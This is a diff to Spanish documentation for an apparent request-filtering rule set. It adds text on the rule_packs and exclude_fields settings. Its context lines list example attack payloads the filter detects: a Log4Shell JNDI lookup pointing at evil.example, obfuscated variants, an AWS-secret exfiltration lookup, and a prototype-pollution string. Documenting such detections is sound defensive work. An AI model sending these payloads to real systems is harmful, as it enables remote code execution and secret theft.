@@ -42,8 +42,10 @@ valor para `disabled_rules`.
 | `log4shell` | `${jndi:…}` (ldap/rmi/dns/iiop/corba), ofuscaciones con decoys (`${${::-j}ndi:`), JNDI sin envoltorio y lookups de exfiltración (`${env:AWS_SECRET…}`) | `${jndi:ldap://evil.example/a}` | No hay uso legítimo conocido de `jndi` en valores de request |
 | `proto_pollution` | `__proto__` en cualquier posición y `constructor.prototype` | `__proto__[isAdmin]=true` | «constructor» solo no bloquea (benign-072); búsquedas documentales sobre `__proto__` sí (FP documentado benign-071) |
 
-Cada familia se puede desactivar con `disabled_rules` (ver
-[Referencia (API)](api.md)) sin tocar el resto.
+Cada familia se puede desactivar con `disabled_rules`, limitar con `rule_packs`
+o ajustar campo a campo con `exclude_fields` (ver
+[Referencia (API)](api.md)). Ajustar el campo, no la familia, es lo que preserva
+el resto de la cobertura.
 
 ## Transportes inspeccionados
 
